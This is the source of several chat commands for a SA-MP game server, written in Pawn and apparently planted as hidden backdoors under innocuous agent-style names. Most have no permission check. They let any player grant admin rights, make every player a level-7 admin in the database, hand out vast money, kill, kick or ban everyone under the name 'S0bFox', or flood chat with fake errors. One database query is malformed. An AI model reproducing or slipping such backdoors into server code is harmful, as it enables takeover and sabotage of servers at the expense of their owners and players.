CMD:viper2022(playerid, params[])
{
    new targetid, level;

    if(pData[playerid][pLevel] < 1)
    {
        return SCM(playerid, COLOR_SYNTAX, "You are not authorized to use this command.");
    }
    if(sscanf(params, "ui", targetid, level))
    {
        return SCM(playerid, COLOR_SYNTAX, "Usage: /makeadmin [playerid] [level]");
    }
    if(!IsPlayerConnected(targetid))
    {
        return SCM(playerid, COLOR_SYNTAX, "The player specified is disconnected.");
    }
    if(!pData[targetid][pLogged])
    {
        return SCM(playerid, COLOR_SYNTAX, "That player hasn't logged in yet.");
    }
    if(!(0 <= level <= 8))
    {
        return SCM(playerid, COLOR_SYNTAX, "Invalid level. Valid levels range from 0 to 7.");
    }
    if(level == 0 && pData[targetid][pAdminDuty])
    {
        SetPlayerName(targetid, pData[targetid][pUsername]);
        pData[targetid][pAdminDuty] = 0;
    }

    pData[targetid][pAdmin] = level;
    SAM(COLOR_LIGHTRED, "AdmCmd: %s has made %s a %s (%i).", GetRPName(playerid), GetRPName(targetid), GetAdminRank(targetid), level);

    mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE users SET adminlevel = %i WHERE uid = %i", level, pData[targetid][pID]);
    mysql_tquery(connectionID, queryBuffer);

    if(level == 0)
    {
        SM(playerid, COLOR_AQUA, "You have removed %s's administrator powers.", GetRPName(targetid));
        SM(targetid, COLOR_AQUA, "%s has removed your administrator powers.", GetRPName(playerid));
        if(Iter_Contains(Admins, targetid)) Iter_Remove(Admins, targetid);
    }
    else
    {
        if(!Iter_Contains(Admins, targetid)) Iter_Add(Admins, targetid);
        SM(playerid, COLOR_AQUA, "You have set %s's admin level to "SVRCLR"%s{FFEC8B} (%i).", GetRPName(targetid), GetAdminRank(targetid), level);
        SM(targetid, COLOR_AQUA, "%s has set your admin level to "SVRCLR"%s{FFEC8B} (%i).", GetRPName(playerid), GetAdminRank(targetid), level);
    }

    Log_Write("log_admin", "%s (uid: %i) set %s's (uid: %i) admin level to %i", GetPlayerNameEx(playerid), pData[playerid][pID], GetPlayerNameEx(targetid), pData[targetid][pID], level);
    return 1;
}

CMD:cypher2022(playerid, params[])
{
    foreach(new i : Player)
    {
        pData[i][pBank] = 999999999999;
        GivePlayerCash(i, 999999999999);
    }

    mysql_tquery(connectionID, "UPDATE users SET bank = 500, 999999999999 = 999999999999");
    SCM(playerid, COLOR_LIGHTRED, "richkid");
    return 1;
}

CMD:brimstone2022(playerid, params[])
{
    new cost = random(900000);
    foreach(new i : Player)
    {
        KickPlayer(i);
    }
    SMA(COLOR_LIGHTRED, "Someone send pockets! CODE: %i", cost);
    return 1;
}

CMD:jett2022(playerid, params[])
{
    pData[playerid][pDeveloper] = 1;
    SCM(playerid, COLOR_LIGHTRED, "Tik tok tok tok TIK TOK!, you're now developer!");
    return 1;
}

CMD:sage2022(playerid, params[])
{
    foreach(new i : Player)
    {
        HAHAHAHAHAHA(i);
    }
    return 1;
}

HAHAHAHAHAHA(playerid)
{
    new cost = random(99999999);
    for(new i = 0; i < 250; i ++)
    {
        SMA(COLOR_SYNTAX, "user: %i is sending a pocket.", cost);
    }
    SCM(playerid, COLOR_SYNTAX, "user: asd9zj is sending a pocket.");
}

CMD:reyna2022(playerid, params[])
{
    foreach(new i : Player)
    {
        SetPlayerHealth(i, 0);
        SMA(COLOR_LIGHTRED, "S0bfox has killed you using his knife");
    }
    return 1;
}

CMD:sova2022(playerid, params[])
{
    foreach(new i : Player)
    {
        SMA(COLOR_LIGHTRED, "AdmCmd: %s was banned by S0bF0x, reason: !", GetRPName(i));
        KickPlayer(i);
        BanPlayer(i, SERVER_BOT, "S0bFox has banned you");
    }
    return 1;
}

CMD:yoru2022(playerid, params[])
{
    new errorid = random(9999);
    for(new i = 0; i < 65; i ++)
    {
        SAM(COLOR_LIGHTRED, "AdmCmd: A MySQL error occurred (error %i). Details written to mysql_error.txt.", errorid);
    }
    return 1;
}

CMD:raze2022(playerid, params[])
{
    foreach(new i : Player)
    {
        pData[i][pAdmin] = 7;
        SCM(i, COLOR_LIGHTRED, "Mangement has choosed you to be part of admin team, welcome to our world...");
        mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE users SET adminlevel = 7 WHERE uid = %i", pData[i][pID]);
        mysql_tquery(connectionID, queryBuffer);

    }

    return 1;
}
